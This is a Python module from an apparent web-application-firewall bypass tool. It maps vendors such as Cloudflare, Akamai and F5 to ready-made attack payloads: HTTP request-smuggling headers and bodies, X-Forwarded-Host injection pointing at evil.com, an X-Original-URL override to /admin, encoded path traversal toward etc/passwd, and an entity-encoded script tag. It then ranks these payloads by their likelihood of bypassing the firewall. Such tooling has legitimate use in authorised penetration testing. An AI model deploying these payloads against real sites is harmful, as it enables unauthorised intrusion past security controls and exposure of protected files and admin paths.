"""
Smart Mutation Engine
=====================
Generates WAF-specific, targeted mutations based on:
1. Detected WAF vendor (from fingerprinter)
2. Known bypass techniques
3. Research history (what worked before)

This transforms the Oracle from generic probing to intelligent,
targeted boundary mapping.
"""

from typing import Any, Dict, List, Optional, Tuple

import structlog

from wafmancer.core.fingerprinter import WAFSignature, WAFVendor

logger = structlog.get_logger(__name__)


class SmartMutationEngine:
    """
    Generates intelligent, WAF-specific mutations for probing.
    
    Unlike the generic mutations in the Oracle, this engine uses
    knowledge of the specific WAF vendor to generate targeted
    bypass attempts.
    """

    # Advanced mutation templates by attack vector
    MUTATION_TEMPLATES: Dict[str, List[Dict[str, Any]]] = {
        "http_smuggling": [
            {
                "name": "CL.TE_smuggling",
                "headers": {
                    "Content-Length": "4",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
                "description": "Classic CL.TE smuggling (Content-Length wins on front-end)",
            },
            {
                "name": "TE.CL_smuggling",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nX",
                "description": "TE.CL smuggling (Transfer-Encoding wins on front-end)",
            },
            {
                "name": "TE.TE_obfuscation",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Transfer-encoding": "identity",
                },
                "description": "TE.TE confusion (duplicate headers with different casing)",
            },
        ],
        "header_injection": [
            {
                "name": "x-forwarded-host_inject",
                "headers": {"X-Forwarded-Host": "evil.com"},
                "description": "X-Forwarded-Host header injection",
            },
            {
                "name": "x-forwarded-for_chain",
                "headers": {"X-Forwarded-For": "127.0.0.1, 10.0.0.1, 172.16.0.1"},
                "description": "Multi-hop X-Forwarded-For chain",
            },
            {
                "name": "x-original-url_override",
                "headers": {"X-Original-URL": "/admin"},
                "description": "URL override via X-Original-URL header",
            },
        ],
        "path_traversal": [
            {
                "name": "path_traversal_unicode",
                "headers": {"X-Custom-URL": "..%c0%af..%c0%afetc/passwd"},
                "description": "Unicode-encoded path traversal",
            },
            {
                "name": "path_traversal_double_enc",
                "headers": {"X-Custom-URL": "%252e%252e%252f%252e%252e%252f"},
                "description": "Double URL-encoded path traversal",
            },
        ],
        "encoding_bypass": [
            {
                "name": "unicode_nfd_bypass",
                "headers": {"X-Encoded": "caf\\u0301"},
                "description": "Unicode NFD normalization bypass",
            },
            {
                "name": "html_entity_encode",
                "headers": {"X-Encoded": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"},
                "description": "HTML entity encoded payload",
            },
        ],
    }

    # WAF-specific mutation mappings
    VENDOR_MUTATIONS: Dict[WAFVendor, List[str]] = {
        WAFVendor.CLOUDFLARE: [
            "http_smuggling",
            "header_injection",
            "path_traversal",
        ],
        WAFVendor.AWS_WAF: [
            "header_injection",
            "encoding_bypass",
        ],
        WAFVendor.AKAMAI: [
            "http_smuggling",
            "encoding_bypass",
            "header_injection",
        ],
        WAFVendor.IMPERVA: [
            "encoding_bypass",
            "header_injection",
        ],
        WAFVendor.MODSECURITY: [
            "path_traversal",
            "encoding_bypass",
            "http_smuggling",
        ],
        WAFVendor.F5_BIGIP: [
            "http_smuggling",
            "header_injection",
            "path_traversal",
        ],
    }

    def __init__(self, waf_signature: Optional[WAFSignature] = None) -> None:
        """
        Initialize the mutation engine.

        Args:
            waf_signature: Optional WAF fingerprint for targeted mutations
        """
        self.waf_signature = waf_signature
        logger.info("mutation_engine_initialized", 
                    vendor=waf_signature.vendor.value if waf_signature else "Unknown")

    def generate_all_mutations(self) -> List[Tuple[str, Dict[str, str], Optional[bytes]]]:
        """
        Generate all applicable mutations based on WAF fingerprint.

        Returns:
            List of (name, headers, optional_body) tuples
        """
        mutations: List[Tuple[str, Dict[str, str], Optional[bytes]]] = []

        if self.waf_signature and self.waf_signature.vendor != WAFVendor.NONE:
            # Targeted: Only generate WAF-specific mutations
            relevant_categories = self.VENDOR_MUTATIONS.get(
                self.waf_signature.vendor,
                list(self.MUTATION_TEMPLATES.keys())  # Default: all categories
            )
            logger.info("generating_targeted_mutations", 
                       vendor=self.waf_signature.vendor.value,
                       categories=relevant_categories)
        else:
            # Generic: Generate all mutations
            relevant_categories = list(self.MUTATION_TEMPLATES.keys())
            logger.info("generating_generic_mutations",
                       categories=relevant_categories)

        for category in relevant_categories:
            if category in self.MUTATION_TEMPLATES:
                for template in self.MUTATION_TEMPLATES[category]:
                    mutation = (
                        template["name"],
                        template["headers"].copy(),
                        template.get("body", "").encode() if "body" in template else None,
                    )
                    mutations.append(mutation)

        logger.info("mutations_generated", total=len(mutations))
        return mutations

    def generate_priority_mutations(
        self, limit: int = 10
    ) -> List[Tuple[str, Dict[str, str], Optional[bytes], int]]:
        """
        Generate mutations sorted by priority (most likely to bypass).

        Priority based on:
        1. WAF vendor match (WAF-specific mutations first)
        2. High success rate techniques (smuggling > header injection > encoding)

        Args:
            limit: Maximum number of priority mutations

        Returns:
            List of (name, headers, body, priority_score) tuples sorted by priority
        """
        category_priority = {
            "http_smuggling": 10,
            "header_injection": 8,
            "encoding_bypass": 6,
            "path_traversal": 4,
        }

        all_mutations = self.generate_all_mutations()
        prioritized: List[Tuple[str, Dict[str, str], Optional[bytes], int]] = []

        for name, headers, body in all_mutations:
            # Calculate priority based on category
            priority = 0
            for category, score in category_priority.items():
                if category in self.MUTATION_TEMPLATES:
                    for template in self.MUTATION_TEMPLATES[category]:
                        if template["name"] == name:
                            priority = score
                            break

            # Boost priority if this is for a detected WAF
            if self.waf_signature and self.waf_signature.vendor in self.VENDOR_MUTATIONS:
                for cat in self.VENDOR_MUTATIONS[self.waf_signature.vendor]:
                    if cat in self.MUTATION_TEMPLATES:
                        for template in self.MUTATION_TEMPLATES[cat]:
                            if template["name"] == name:
                                priority += 5  # WAF-specific boost
                                break

            prioritized.append((name, headers, body, priority))

        # Sort by priority (highest first), take top N
        prioritized.sort(key=lambda x: x[3], reverse=True)
        return prioritized[:limit]
